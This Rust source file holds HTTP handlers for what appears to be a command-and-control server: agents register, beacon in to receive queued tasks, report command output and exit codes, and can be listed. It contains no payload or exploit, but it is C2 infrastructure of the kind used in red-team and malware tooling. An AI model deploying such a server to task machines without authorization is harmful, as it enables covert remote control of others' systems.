use bytes::Bytes;
use http_body_util::Full;
use hyper::{Response, StatusCode};
use protocol::*;
use crate::state::State;
use std::sync::{Arc, Mutex};
use super::response::{json_response, error_response};

pub fn handle_register(
    body_bytes: &Bytes,
    state: Arc<Mutex<State>>,
) -> Response<Full<Bytes>> {
    let request: RegisterRequest = match serde_json::from_slice(body_bytes) {
        Ok(data) => data,
        Err(_) => return error_response("Invalid JSON", StatusCode::BAD_REQUEST),
    };
    
    let agent_id = state.lock().unwrap().add_agent(request);
    json_response(RegisterResponse { agent_id }, StatusCode::OK)
}

pub fn handle_beacon(
    body_bytes: &Bytes,
    state: Arc<Mutex<State>>,
) -> Response<Full<Bytes>> {
    let request: BeaconRequest = match serde_json::from_slice(body_bytes) {
        Ok(data) => data,
        Err(_) => return error_response("Invalid JSON", StatusCode::BAD_REQUEST),
    };

    let mut state = state.lock().unwrap();
    if !state.agent_exists(request.agent_id) {
        return error_response("Unknown agent", StatusCode::NOT_FOUND);
    }

    state.update_last_seen(request.agent_id);
    let task = state.get_next_task(request.agent_id);
    
    if task.is_some() {
        println!("[*] Sending task to agent {}", request.agent_id);
    }
    
    json_response(BeaconResponse { task }, StatusCode::OK)
}

pub fn handle_task_result(
    body_bytes: &Bytes,
    state: Arc<Mutex<State>>,
) -> Response<Full<Bytes>> {
    let request: TaskResultRequest = match serde_json::from_slice(body_bytes) {
        Ok(data) => data,
        Err(_) => return error_response("Invalid JSON", StatusCode::BAD_REQUEST),
    };

    let mut state = state.lock().unwrap();
    let success = state.save_task_result(request.task_id, request.output, request.exit_code);
    
    if !success {
        return error_response("Unknown task", StatusCode::NOT_FOUND);
    }
    
    json_response(TaskResultResponse { success: true }, StatusCode::OK)
}

pub fn handle_list_agents(state: Arc<Mutex<State>>) -> Response<Full<Bytes>> {
    let state = state.lock().unwrap();
    let agents = state.list_agents();
    json_response(agents, StatusCode::OK)
}
